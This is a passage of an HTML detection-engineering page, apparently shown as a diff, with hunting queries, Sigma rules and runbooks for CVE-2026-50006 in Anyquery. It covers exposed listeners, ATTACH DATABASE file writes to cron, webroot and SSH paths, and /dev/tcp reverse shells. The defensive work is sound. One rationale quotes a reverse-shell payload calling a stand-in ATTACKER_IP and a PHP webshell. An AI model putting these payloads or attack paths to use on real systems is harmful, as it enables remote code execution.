+    <div class="tab-content" id="art-241-uc0-spl"><span class="splunk-cat-pill splunk-cat-endpoint" title="Splunk-research detection category">ENDPOINT</span><div class="spl-toggle-group"><div class="spl-mode-toggle">  <button class="spl-mode-btn active" data-spl-mode="acc" data-target="art-241-uc0-spl-acc">Summarised</button>  <button class="spl-mode-btn" data-spl-mode="raw" data-target="art-241-uc0-spl-raw">Non-summarised</button>  <span class="spl-mode-hint">Toggle if your env has no CIM data-model acceleration.</span></div><pre class="spl-mode-body active" id="art-241-uc0-spl-acc"><button class="copy-btn">COPY</button><code>| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where Processes.process_name=anyquery Processes.process=&quot;*server*&quot; Processes.process=&quot;*0.0.0.0*&quot; by Processes.dest Processes.user Processes.process_name Processes.process Processes.parent_process_name
+| `drop_dm_object_name(Processes)`
+| convert timeformat=&quot;%Y-%m-%dT%H:%M:%S&quot; ctime(firstTime) ctime(lastTime)</code></pre><pre class="spl-mode-body" id="art-241-uc0-spl-raw"><button class="copy-btn">COPY</button><code>| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where Processes.process_name=anyquery Processes.process=&quot;*server*&quot; Processes.process=&quot;*0.0.0.0*&quot; by Processes.dest Processes.user Processes.process_name Processes.process Processes.parent_process_name
+| `drop_dm_object_name(Processes)`
+| convert timeformat=&quot;%Y-%m-%dT%H:%M:%S&quot; ctime(firstTime) ctime(lastTime)</code></pre></div></div>
+  </div>
+</details>
+<details class="uc" data-uc-slug="df438e49a9" data-platforms="def,falcon,sent,spl" data-targets="windows">
+  <summary>
+    <span class="uc-title">Inbound connection to Anyquery listener from a public IP</span>
+    <span class="uc-kind" title="AI-generated for this specific article — drafted from the article text and cross-checked against vendor advisories">AI</span><span class="uc-phase">Delivery</span>
+    <span class="uc-conf medium">Medium</span>
+    <button class="share-btn" data-share-uc="df438e49a9" title="Copy share link to this UC" aria-label="Copy share link">
+      <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>
+    </button>
+  </summary>
+  <div class="uc-body">
+    <div class="uc-desc">Hunts for external (public-IP) network connections accepted by the Anyquery process, indicating an internet-reachable, unauthenticated MySQL-compatible endpoint is being reached by outside clients — the delivery vector for the CVE-2026-50006 ATTACH DATABASE write.
+
+Rationale: Ties the accepted inbound connection directly to the `anyquery` process (InitiatingProcess/ContextImageFileName) with a public remote peer, matching the article&#x27;s &#x27;unauthenticated attackers connecting to the MySQL-compatible server port&#x27;. Sentinel/Datadog left empty because inbound-accept events with process attribution are not present in the ASIM network or standard Datadog Linux schemas (explained per prompt guidance).
+
+Cross-checked against:
+  • https://github.com/advisories/GHSA-xrcf-6jh3-ggvx</div>
+    <div class="uc-meta"><span class="ind-label">ATT&amp;CK</span><span class="ind tech" title="Exploit Public-Facing Application">T1190</span> <span class="ind tech" title="Network Service Scanning">T1046</span></div>
+    <div class="uc-meta"><span class="ind-label">Data sources</span><span class="ind">Network_Traffic.All_Traffic</span></div>
+    <details class="uc-fp"><summary>Expected false positives · estimated rate: medium<span class="uc-fp-note"> — model-assessed, tune to your environment</span></summary><ul><li>Legitimate BI/reporting clients connecting to an intentionally public Anyquery endpoint</li><li>Cloud provider health-check probes hitting the exposed port</li><li>Internet-wide scanners (Shodan/Censys) touching the port without exploitation</li><li>VPN-exit / NAT gateway making internal client traffic appear as a single public IP</li></ul></details><details class="uc-fp"><summary>Response runbook</summary><div class="uc-runbook">1) Triage: geolocate/reputation-check the RemoteIP and count distinct source IPs; a spray of unique public IPs suggests mass scanning. 2) Contain: restrict the listener to trusted source ranges and upgrade to Anyquery &gt;= 0.4.5. 3) Hunt: for any RemoteIP of interest, pivot to DeviceFileEvents for anyquery writes to persistence paths and to DeviceProcessEvents for downstream cron/webshell reverse shells within the following minutes.</div></details>
+    <div class="tabs">
+      <button class="tab-btn active" data-target="art-241-uc1-kql">Defender KQL</button>
+      <button class="tab-btn" data-target="art-241-uc1-sentinel">Sentinel KQL</button>
+      <button class="tab-btn" data-target="art-241-uc1-falcon">Falcon LogScale</button>
+      <button class="tab-btn" data-target="art-241-uc1-spl">Splunk SPL (CIM)</button>
+    </div>
+    <div class="tab-content active" id="art-241-uc1-kql"><pre><button class="copy-btn">COPY</button><code>DeviceNetworkEvents
+| where Timestamp &gt; ago(7d)
+| where InitiatingProcessFileName =~ &quot;anyquery&quot;
+| where ActionType == &quot;InboundConnectionAccepted&quot;
+| where RemoteIPType == &quot;Public&quot;
+| summarize Connections = count(), Ports = make_set(LocalPort, 10), First = min(Timestamp), Last = max(Timestamp) by DeviceName, RemoteIP, InitiatingProcessCommandLine
+| order by Connections desc</code></pre></div>
+    <div class="tab-content" id="art-241-uc1-sentinel"><pre><button class="copy-btn">COPY</button><code>// Microsoft Sentinel — auto-derived from the Defender XDR hunt.
+// Requires the Microsoft 365 Defender data connector (streams the
+// advanced-hunting tables into Sentinel; Timestamp → TimeGenerated).
+DeviceNetworkEvents
+| where TimeGenerated &gt; ago(7d)
+| where InitiatingProcessFileName =~ &quot;anyquery&quot;
+| where ActionType == &quot;InboundConnectionAccepted&quot;
+| where RemoteIPType == &quot;Public&quot;
+| summarize Connections = count(), Ports = make_set(LocalPort, 10), First = min(TimeGenerated), Last = max(TimeGenerated) by DeviceName, RemoteIP, InitiatingProcessCommandLine
+| order by Connections desc</code></pre></div>
+    <div class="tab-content" id="art-241-uc1-falcon"><pre><button class="copy-btn">COPY</button><code>#event_simpleName=NetworkConnectIP4 ContextImageFileName=/anyquery$/i
+| ConnectionDirection=1
+| groupBy([aid, ComputerName, RemoteAddressIP4, RemotePort, LocalPort], function=count())</code></pre></div>
+    <div class="tab-content" id="art-241-uc1-spl"><span class="splunk-cat-pill splunk-cat-network" title="Splunk-research detection category">NETWORK</span><div class="spl-toggle-group"><div class="spl-mode-toggle">  <button class="spl-mode-btn active" data-spl-mode="acc" data-target="art-241-uc1-spl-acc">Summarised</button>  <button class="spl-mode-btn" data-spl-mode="raw" data-target="art-241-uc1-spl-raw">Non-summarised</button>  <span class="spl-mode-hint">Toggle if your env has no CIM data-model acceleration.</span></div><pre class="spl-mode-body active" id="art-241-uc1-spl-acc"><button class="copy-btn">COPY</button><code>| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime from datamodel=Network_Traffic.All_Traffic where All_Traffic.app=anyquery All_Traffic.direction=inbound by All_Traffic.src All_Traffic.dest All_Traffic.dest_port All_Traffic.app
+| `drop_dm_object_name(All_Traffic)`
+| convert timeformat=&quot;%Y-%m-%dT%H:%M:%S&quot; ctime(firstTime) ctime(lastTime)</code></pre><pre class="spl-mode-body" id="art-241-uc1-spl-raw"><button class="copy-btn">COPY</button><code>| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime from datamodel=Network_Traffic.All_Traffic where All_Traffic.app=anyquery All_Traffic.direction=inbound by All_Traffic.src All_Traffic.dest All_Traffic.dest_port All_Traffic.app
+| `drop_dm_object_name(All_Traffic)`
+| convert timeformat=&quot;%Y-%m-%dT%H:%M:%S&quot; ctime(firstTime) ctime(lastTime)</code></pre></div></div>
+  </div>
+</details>
+<details class="uc" data-uc-slug="f92f9fc95e" data-platforms="def,falcon,sent,sigma,spl" data-targets="linux,vcs,windows">
+  <summary>
+    <span class="uc-title">Anyquery process writing files to cron/webroot/SSH persistence paths (ATTACH DATABASE AFW)</span>
+    <span class="uc-kind" title="AI-generated for this specific article — drafted from the article text and cross-checked against vendor advisories">AI</span><span class="uc-phase">Installation</span>
+    <span class="uc-conf high">High</span>
+    <button class="share-btn" data-share-uc="f92f9fc95e" title="Copy share link to this UC" aria-label="Copy share link">
+      <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>
+    </button>
+  </summary>
+  <div class="uc-body">
+    <div class="uc-desc">Highest-fidelity detection for CVE-2026-50006: the Anyquery process itself creating files under cron directories, web roots, or SSH key paths. ATTACH DATABASE materialises a SQLite file at the attacker-chosen path, so a write by anyquery into /etc/cron.d, /var/spool/cron, /var/www, or /root/.ssh is a direct exploitation signal.
+
+Rationale: Combines the article&#x27;s exact write targets (/etc/cron.d/pwn, /var/spool/cron/crontabs, /var/www/html/shell.php, /root/.ssh/authorized_keys) with the initiating process being anyquery — a database-federation tool that has no legitimate reason to write into cron/webroot/SSH. Datadog omitted because auditd file-target-path is not in the standard Datadog Linux schema.
+
+Cross-checked against:
+  • https://github.com/advisories/GHSA-xrcf-6jh3-ggvx</div>
+    <div class="uc-meta"><span class="ind-label">ATT&amp;CK</span><span class="ind tech" title="Exploit Public-Facing Application">T1190</span> <span class="ind tech" title="Scheduled Task/Job: Cron">T1053.003</span> <span class="ind tech" title="Server Software Component: Web Shell">T1505.003</span></div>
+    <div class="uc-meta"><span class="ind-label">Data sources</span><span class="ind">Endpoint.Filesystem</span></div>
+    <details class="uc-fp"><summary>Expected false positives · estimated rate: low<span class="uc-fp-note"> — model-assessed, tune to your environment</span></summary><ul><li>Backup/restore tooling copying an Anyquery .db into /var/www or a home directory</li><li>Sysadmin manually redirecting Anyquery output to a file under an atypical path</li><li>Anyquery legitimately configured with its data directory pointed at a shared web-served folder</li><li>Config-management (Ansible/Puppet) running as the anyquery service account writing crontab entries</li></ul><div class="uc-fp-filter"><span class="ind-label">Suppression filter</span><pre><code>| where not (FolderPath has &quot;/var/www&quot; and FileName endswith &quot;.db&quot; and InitiatingProcessCommandLine has &quot;--datadir&quot;)</code></pre></div></details><details class="uc-fp"><summary>Response runbook</summary><div class="uc-runbook">1) Triage: inspect the written file — a valid SQLite header (`SQLite format 3`) followed by cron/PHP/SSH-key text confirms the ATTACH DATABASE abuse. Note the target path and owning UID. 2) Contain: delete the malicious file, kill the anyquery process, isolate the host, and upgrade to &gt;= 0.4.5. 3) Hunt: check cron execution and web/PHP process trees for the injected reverse-shell payload and review /root/.ssh/authorized_keys for attacker keys.</div></details>
+    <div class="tabs">
+      <button class="tab-btn active" data-target="art-241-uc2-kql">Defender KQL</button>
+      <button class="tab-btn" data-target="art-241-uc2-sentinel">Sentinel KQL</button>
+      <button class="tab-btn" data-target="art-241-uc2-sigma">Sigma</button>
+      <button class="tab-btn" data-target="art-241-uc2-falcon">Falcon LogScale</button>
+      <button class="tab-btn" data-target="art-241-uc2-spl">Splunk SPL (CIM)</button>
+    </div>
+    <div class="tab-content active" id="art-241-uc2-kql"><pre><button class="copy-btn">COPY</button><code>DeviceFileEvents
+| where Timestamp &gt; ago(7d)
+| where InitiatingProcessFileName =~ &quot;anyquery&quot;
+| where FolderPath has_any (&quot;/etc/cron.d&quot;, &quot;/var/spool/cron&quot;, &quot;/etc/cron.hourly&quot;, &quot;/etc/cron.daily&quot;, &quot;/etc/crontab&quot;, &quot;/var/www&quot;, &quot;/root/.ssh&quot;) or FileName =~ &quot;authorized_keys&quot;
+| project Timestamp, DeviceName, InitiatingProcessAccountName, FolderPath, FileName, ActionType, InitiatingProcessCommandLine
+| order by Timestamp desc</code></pre></div>
+    <div class="tab-content" id="art-241-uc2-sentinel"><pre><button class="copy-btn">COPY</button><code>ImFileEvent
+| where TimeGenerated &gt; ago(7d)
+| where ActingProcessName has &quot;anyquery&quot;
+| where TargetFilePath has_any (&quot;/etc/cron.d&quot;, &quot;/var/spool/cron&quot;, &quot;/etc/cron.hourly&quot;, &quot;/etc/cron.daily&quot;, &quot;/etc/crontab&quot;, &quot;/var/www&quot;, &quot;/root/.ssh&quot;, &quot;authorized_keys&quot;)
+| project TimeGenerated, DvcHostname, ActorUsername, TargetFilePath, ActingProcessName, ActingProcessCommandLine
+| order by TimeGenerated desc</code></pre></div>
+    <div class="tab-content" id="art-241-uc2-sigma"><pre><button class="copy-btn">COPY</button><code>title: Anyquery Writes To Cron Webroot Or SSH Persistence Path
+id: 9c3d7e14-6a2b-4d88-b1e2-7f4c9a0b2c33
+description: Detects the Anyquery process creating files under cron, web root, or SSH key directories, the ATTACH DATABASE arbitrary file write primitive of CVE-2026-50006.
+references:
+  - https://github.com/advisories/GHSA-xrcf-6jh3-ggvx
+author: SOC Detection Engineering
+date: 2026/07/15
+tags:
+  - attack.t1190
+  - attack.t1053.003
+  - attack.t1505.003
+logsource:
+  category: file_event
+  product: linux
+detection:
+  selection:
+    Image|endswith: &#x27;/anyquery&#x27;
+    TargetFilename|contains:
+      - &#x27;/etc/cron.d&#x27;
+      - &#x27;/var/spool/cron&#x27;
+      - &#x27;/etc/cron.hourly&#x27;
+      - &#x27;/etc/cron.daily&#x27;
+      - &#x27;/var/www&#x27;
+      - &#x27;/root/.ssh&#x27;
+  condition: selection
+level: high</code></pre></div>
+    <div class="tab-content" id="art-241-uc2-falcon"><pre><button class="copy-btn">COPY</button><code>#event_simpleName=FileWritten ContextImageFileName=/anyquery$/i
+| TargetFileName=/\/(etc\/cron\.(d|hourly|daily)|etc\/crontab|var\/spool\/cron|var\/www|root\/\.ssh)/i
+| groupBy([aid, ComputerName, TargetFileName, ContextImageFileName], function=count())</code></pre></div>
+    <div class="tab-content" id="art-241-uc2-spl"><span class="splunk-cat-pill splunk-cat-endpoint" title="Splunk-research detection category">ENDPOINT</span><div class="spl-toggle-group"><div class="spl-mode-toggle">  <button class="spl-mode-btn active" data-spl-mode="acc" data-target="art-241-uc2-spl-acc">Summarised</button>  <button class="spl-mode-btn" data-spl-mode="raw" data-target="art-241-uc2-spl-raw">Non-summarised</button>  <span class="spl-mode-hint">Toggle if your env has no CIM data-model acceleration.</span></div><pre class="spl-mode-body active" id="art-241-uc2-spl-acc"><button class="copy-btn">COPY</button><code>| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Filesystem where Filesystem.file_path IN (&quot;/etc/cron.d/*&quot;,&quot;/var/spool/cron/*&quot;,&quot;/etc/cron.hourly/*&quot;,&quot;/etc/cron.daily/*&quot;,&quot;/var/www/*&quot;,&quot;/root/.ssh/*&quot;) by Filesystem.dest Filesystem.file_path Filesystem.file_name Filesystem.action
+| `drop_dm_object_name(Filesystem)`
+| convert timeformat=&quot;%Y-%m-%dT%H:%M:%S&quot; ctime(firstTime) ctime(lastTime)</code></pre><pre class="spl-mode-body" id="art-241-uc2-spl-raw"><button class="copy-btn">COPY</button><code>| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Filesystem where Filesystem.file_path IN (&quot;/etc/cron.d/*&quot;,&quot;/var/spool/cron/*&quot;,&quot;/etc/cron.hourly/*&quot;,&quot;/etc/cron.daily/*&quot;,&quot;/var/www/*&quot;,&quot;/root/.ssh/*&quot;) by Filesystem.dest Filesystem.file_path Filesystem.file_name Filesystem.action
+| `drop_dm_object_name(Filesystem)`
+| convert timeformat=&quot;%Y-%m-%dT%H:%M:%S&quot; ctime(firstTime) ctime(lastTime)</code></pre></div></div>
+  </div>
+</details>
+<details class="uc" data-uc-slug="dd11d6efd2" data-platforms="datadog,sent,spl" data-targets="linux">
+  <summary>
+    <span class="uc-title">ATTACH DATABASE statement targeting persistence paths in Anyquery query logs</span>
+    <span class="uc-kind" title="AI-generated for this specific article — drafted from the article text and cross-checked against vendor advisories">AI</span><span class="uc-phase">Exploitation</span>
+    <span class="uc-conf medium">Medium</span>
+    <button class="share-btn" data-share-uc="dd11d6efd2" title="Copy share link to this UC" aria-label="Copy share link">
+      <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>
+    </button>
+  </summary>
+  <div class="uc-body">
+    <div class="uc-desc">Hunts application/syslog output from the Anyquery server for the literal ATTACH DATABASE statement pointed at a sensitive filesystem path — the exploitation primitive of CVE-2026-50006 captured at the query layer before or as the file write occurs.
+
+Rationale: Directly hunts the article&#x27;s exploitation string `ATTACH DATABASE &#x27;/etc/cron.d/pwn&#x27;` / `&#x27;/var/www/html/shell.php&#x27;` at the query layer, per reviewer request. Defender/Falcon left empty because SQL query text is application-log data not present in EDR/FDR endpoint schemas; deployability depends on Anyquery query logging being enabled and forwarded to syslog.
+
+Cross-checked against:
+  • https://github.com/advisories/GHSA-xrcf-6jh3-ggvx</div>
+    <div class="uc-meta"><span class="ind-label">ATT&amp;CK</span><span class="ind tech" title="Exploit Public-Facing Application">T1190</span></div>
+    <div class="uc-meta"><span class="ind-label">Data sources</span></div>
+    <details class="uc-fp"><summary>Expected false positives · estimated rate: medium<span class="uc-fp-note"> — model-assessed, tune to your environment</span></summary><ul><li>Legitimate administrator using ATTACH DATABASE to mount a secondary DB during maintenance</li><li>Security-team validation/PoC testing of the CVE against a lab instance</li><li>Application code that legitimately attaches a scratch DB under /tmp or the data dir</li><li>Log lines quoting the advisory text in an ops/incident channel forwarded to syslog</li></ul><div class="uc-fp-filter"><span class="ind-label">Suppression filter</span><pre><code>| where not (SyslogMessage has &quot;ATTACH DATABASE&quot; and SyslogMessage has_any (&quot;/tmp/&quot;, &quot;--datadir&quot;))</code></pre></div></details><details class="uc-fp"><summary>Response runbook</summary><div class="uc-runbook">1) Triage: read the full statement — a target path outside the Anyquery data directory (cron/webroot/SSH) is malicious; note the client IP if the log records it. 2) Contain: block the source IP, restrict/patch the listener (&gt;= 0.4.5). 3) Hunt: confirm the corresponding file write (AFW use case) and any resulting cron/webshell reverse-shell execution on the host.</div></details>
+    <div class="tabs">
+      <button class="tab-btn active" data-target="art-241-uc3-sentinel">Sentinel KQL</button>
+      <button class="tab-btn" data-target="art-241-uc3-datadog">Datadog</button>
+      <button class="tab-btn" data-target="art-241-uc3-spl">Splunk SPL (CIM)</button>
+    </div>
+    <div class="tab-content active" id="art-241-uc3-sentinel"><pre><button class="copy-btn">COPY</button><code>Syslog
+| where TimeGenerated &gt; ago(7d)
+| where ProcessName has &quot;anyquery&quot; or SyslogMessage has &quot;anyquery&quot;
+| where SyslogMessage has &quot;ATTACH DATABASE&quot;
+| where SyslogMessage has_any (&quot;/etc/cron&quot;, &quot;/var/www&quot;, &quot;/root/.ssh&quot;, &quot;/var/spool/cron&quot;, &quot;.php&quot;, &quot;authorized_keys&quot;)
+| project TimeGenerated, Computer, ProcessName, SyslogMessage
+| order by TimeGenerated desc</code></pre></div>
+    <div class="tab-content" id="art-241-uc3-datadog"><pre><button class="copy-btn">COPY</button><code>source:linux.syslog @process.name:anyquery (*&quot;ATTACH DATABASE&quot;* OR *&quot;attach database&quot;*) (*/etc/cron* OR */var/www* OR */root/.ssh* OR */var/spool/cron* OR *.php*)</code></pre></div>
+    <div class="tab-content" id="art-241-uc3-spl"><span class="splunk-cat-pill splunk-cat-application" title="Splunk-research detection category">APPLICATION</span><pre><button class="copy-btn">COPY</button><code>index=* (sourcetype=anyquery OR source=&quot;*anyquery*&quot; OR sourcetype=syslog) &quot;ATTACH DATABASE&quot; (&quot;/etc/cron&quot; OR &quot;/var/www&quot; OR &quot;/root/.ssh&quot; OR &quot;/var/spool/cron&quot; OR &quot;.php&quot;)
+| stats count min(_time) as firstTime max(_time) as lastTime values(_raw) as sample by host
+| convert timeformat=&quot;%Y-%m-%dT%H:%M:%S&quot; ctime(firstTime) ctime(lastTime)</code></pre></div>
+  </div>
+</details>
+<details class="uc" data-uc-slug="a657afc69c" data-platforms="datadog,def,falcon,sent,sigma,spl" data-targets="linux,vcs,windows">
+  <summary>
+    <span class="uc-title">Reverse shell via cron/webshell payload dropped through Anyquery AFW (/dev/tcp)</span>
+    <span class="uc-kind" title="AI-generated for this specific article — drafted from the article text and cross-checked against vendor advisories">AI</span><span class="uc-phase">Command &amp; Control</span>
+    <span class="uc-conf high">High</span>
+    <button class="share-btn" data-share-uc="a657afc69c" title="Copy share link to this UC" aria-label="Copy share link">
+      <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>
+    </button>
+  </summary>
+  <div class="uc-body">
+    <div class="uc-desc">Detects execution of the reverse-shell payload the article writes via ATTACH DATABASE: a cron- or web-server-parented shell invoking a /dev/tcp bash reverse connection. This is the downstream RCE stage after the arbitrary file write of CVE-2026-50006.
+
+Rationale: Matches the article&#x27;s exact PoC payload `bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/1337 0&gt;&amp;1` executed from a cron parent, plus the PHP webshell `system($_GET[cmd])` spawning shells from php/httpd/nginx. The /dev/tcp + service-parent pairing is high-fidelity and article-specific.
+
+Cross-checked against:
+  • https://github.com/advisories/GHSA-xrcf-6jh3-ggvx</div>
+    <div class="uc-meta"><span class="ind-label">ATT&amp;CK</span><span class="ind tech" title="Command and Scripting Interpreter: Unix Shell">T1059.004</span> <span class="ind tech" title="Scheduled Task/Job: Cron">T1053.003</span></div>
+    <div class="uc-meta"><span class="ind-label">Data sources</span><span class="ind">Endpoint.Processes</span></div>
+    <details class="uc-fp"><summary>Expected false positives · estimated rate: low<span class="uc-fp-note"> — model-assessed, tune to your environment</span></summary><ul><li>Legitimate cron-scheduled health-check scripts using /dev/tcp to test port reachability</li><li>Developer debugging a service with a bash /dev/tcp one-liner</li><li>Monitoring agents that shell out from php-fpm/nginx for diagnostics</li><li>CI/CD job under a web-server account running network test snippets</li></ul><div class="uc-fp-filter"><span class="ind-label">Suppression filter</span><pre><code>| where not (InitiatingProcessCommandLine has &quot;healthcheck&quot; or ProcessCommandLine has &quot;healthcheck&quot;)</code></pre></div></details><details class="uc-fp"><summary>Response runbook</summary><div class="uc-runbook">1) Triage: extract the reverse-shell destination IP/port from the command line and confirm the parent (cron entry or web PID); pull the offending cron file / webshell. 2) Contain: isolate the host, kill the shell and parent, block the C2 IP at the firewall. 3) Hunt: trace back to the Anyquery file-write and ATTACH DATABASE query that dropped the payload, and sweep other hosts running vulnerable Anyquery for identical cron/webroot artifacts.</div></details>
+    <div class="tabs">
+      <button class="tab-btn active" data-target="art-241-uc4-kql">Defender KQL</button>
+      <button class="tab-btn" data-target="art-241-uc4-sentinel">Sentinel KQL</button>
+      <button class="tab-btn" data-target="art-241-uc4-sigma">Sigma</button>
+      <button class="tab-btn" data-target="art-241-uc4-datadog">Datadog</button>
+      <button class="tab-btn" data-target="art-241-uc4-falcon">Falcon LogScale</button>
+      <button class="tab-btn" data-target="art-241-uc4-spl">Splunk SPL (CIM)</button>
+    </div>
+    <div class="tab-content active" id="art-241-uc4-kql"><pre><button class="copy-btn">COPY</button><code>DeviceProcessEvents
+| where Timestamp &gt; ago(7d)
+| where InitiatingProcessFileName in~ (&quot;cron&quot;,&quot;crond&quot;,&quot;php&quot;,&quot;php-fpm&quot;,&quot;apache2&quot;,&quot;httpd&quot;,&quot;nginx&quot;,&quot;sh&quot;,&quot;bash&quot;)
+| where ProcessCommandLine has &quot;/dev/tcp/&quot; or (ProcessCommandLine has &quot;bash&quot; and ProcessCommandLine has_any (&quot;&gt;&amp; /dev/tcp&quot;,&quot;0&gt;&amp;1&quot;))
+| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, FileName, ProcessCommandLine
+| order by Timestamp desc</code></pre></div>
+    <div class="tab-content" id="art-241-uc4-sentinel"><pre><button class="copy-btn">COPY</button><code>ImProcessCreate
+| where TimeGenerated &gt; ago(7d)
+| where ParentProcessName has_any (&quot;cron&quot;,&quot;crond&quot;,&quot;php&quot;,&quot;php-fpm&quot;,&quot;apache2&quot;,&quot;httpd&quot;,&quot;nginx&quot;)
+| where TargetProcessCommandLine has &quot;/dev/tcp/&quot; or TargetProcessCommandLine has &quot;0&gt;&amp;1&quot;
+| project TimeGenerated, DvcHostname, ActorUsername, ParentProcessName, TargetProcessName, TargetProcessCommandLine
+| order by TimeGenerated desc</code></pre></div>
+    <div class="tab-content" id="art-241-uc4-sigma"><pre><button class="copy-btn">COPY</button><code>title: Reverse Shell Via Cron Or Webserver Parented dev tcp
+id: 2f7a9c05-4e1d-4b3a-8f6c-0d2e5a7b1c44
+description: Detects a cron or web-server parented shell invoking a /dev/tcp bash reverse connection, the RCE payload dropped via Anyquery ATTACH DATABASE AFW (CVE-2026-50006).
+references:
+  - https://github.com/advisories/GHSA-xrcf-6jh3-ggvx
+author: SOC Detection Engineering
+date: 2026/07/15
+tags:
+  - attack.t1059.004
+  - attack.t1053.003
+logsource:
+  category: process_creation
+  product: linux
+detection:
+  selection_parent:
+    ParentImage|endswith:
+      - &#x27;/cron&#x27;
+      - &#x27;/crond&#x27;
+      - &#x27;/php&#x27;
+      - &#x27;/php-fpm&#x27;
+      - &#x27;/apache2&#x27;
+      - &#x27;/httpd&#x27;
+      - &#x27;/nginx&#x27;
+  selection_cmd:
+    CommandLine|contains:
+      - &#x27;/dev/tcp/&#x27;
+      - &#x27;0&gt;&amp;1&#x27;
+  condition: selection_parent and selection_cmd
+level: high</code></pre></div>
+    <div class="tab-content" id="art-241-uc4-datadog"><pre><button class="copy-btn">COPY</button><code>source:linux.auditd @auditd.type:EXECVE @process.command_line:*/dev/tcp/*</code></pre></div>
+    <div class="tab-content" id="art-241-uc4-falcon"><pre><button class="copy-btn">COPY</button><code>#event_simpleName=ProcessRollup2 ParentBaseFileName=/(cron|crond|php|php-fpm|apache2|httpd|nginx)/i
+| regex(&quot;/dev/tcp/&quot;, field=CommandLine)
+| groupBy([aid, ComputerName, ParentBaseFileName, ImageFileName, CommandLine], function=count())</code></pre></div>
+    <div class="tab-content" id="art-241-uc4-spl"><span class="splunk-cat-pill splunk-cat-endpoint" title="Splunk-research detection category">ENDPOINT</span><div class="spl-toggle-group"><div class="spl-mode-toggle">  <button class="spl-mode-btn active" data-spl-mode="acc" data-target="art-241-uc4-spl-acc">Summarised</button>  <button class="spl-mode-btn" data-spl-mode="raw" data-target="art-241-uc4-spl-raw">Non-summarised</button>  <span class="spl-mode-hint">Toggle if your env has no CIM data-model acceleration.</span></div><pre class="spl-mode-body active" id="art-241-uc4-spl-acc"><button class="copy-btn">COPY</button><code>| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where Processes.process=&quot;*/dev/tcp/*&quot; Processes.parent_process_name IN (cron,crond,php,php-fpm,apache2,httpd,nginx,sh,bash) by Processes.dest Processes.user Processes.parent_process_name Processes.process_name Processes.process
+| `drop_dm_object_name(Processes)`
+| convert timeformat=&quot;%Y-%m-%dT%H:%M:%S&quot; ctime(firstTime) ctime(lastTime)</code></pre><pre class="spl-mode-body" id="art-241-uc4-spl-raw"><button class="copy-btn">COPY</button><code>| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where Processes.process=&quot;*/dev/tcp/*&quot; Processes.parent_process_name IN (cron,crond,php,php-fpm,apache2,httpd,nginx,sh,bash) by Processes.dest Processes.user Processes.parent_process_name Processes.process_name Processes.process
+| `drop_dm_object_name(Processes)`
+| convert timeformat=&quot;%Y-%m-%dT%H:%M:%S&quot; ctime(firstTime) ctime(lastTime)</code></pre></div></div>
+  </div>
+</details>
+<details class="uc" data-uc-slug="222a505c20" data-platforms="def,sent,spl" data-targets="">
+  <summary>
+    <span class="uc-title">Asset exposure — vulnerability matches article CVE(s)</span>
+    <span class="uc-phase">Reconnaissance</span>
+    <span class="uc-conf high">High</span>
+    <button class="share-btn" data-share-uc="222a505c20" title="Copy share link to this UC" aria-label="Copy share link">
+      <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>
+    </button>
+  </summary>
+  <div class="uc-body">
+    <div class="uc-desc">Match vulnerability scanner output to the CVE(s) named in the article.</div>
+    <div class="uc-meta"><span class="ind-label">ATT&amp;CK</span><span class="ind tech" title="Exploit Public-Facing Application">T1190</span></div>
+    <div class="uc-meta"><span class="ind-label">Data sources</span><span class="ind">Vulnerabilities</span> <span class="ind">DeviceInfo</span> <span class="ind">DeviceTvmSoftwareVulnerabilities</span></div>
+    
+    <div class="tabs">
+      <button class="tab-btn active" data-target="art-241-uc5-kql">Defender KQL</button>
+      <button class="tab-btn" data-target="art-241-uc5-sentinel">Sentinel KQL</button>
+      <button class="tab-btn" data-target="art-241-uc5-spl">Splunk SPL (CIM)</button>
+    </div>
+    <div class="tab-content active" id="art-241-uc5-kql"><pre><button class="copy-btn">COPY</button><code>// TVM tables are daily snapshots — pin a 1-day window so the engine
+// partitions on Timestamp instead of scanning the full retention.
+DeviceTvmSoftwareVulnerabilities
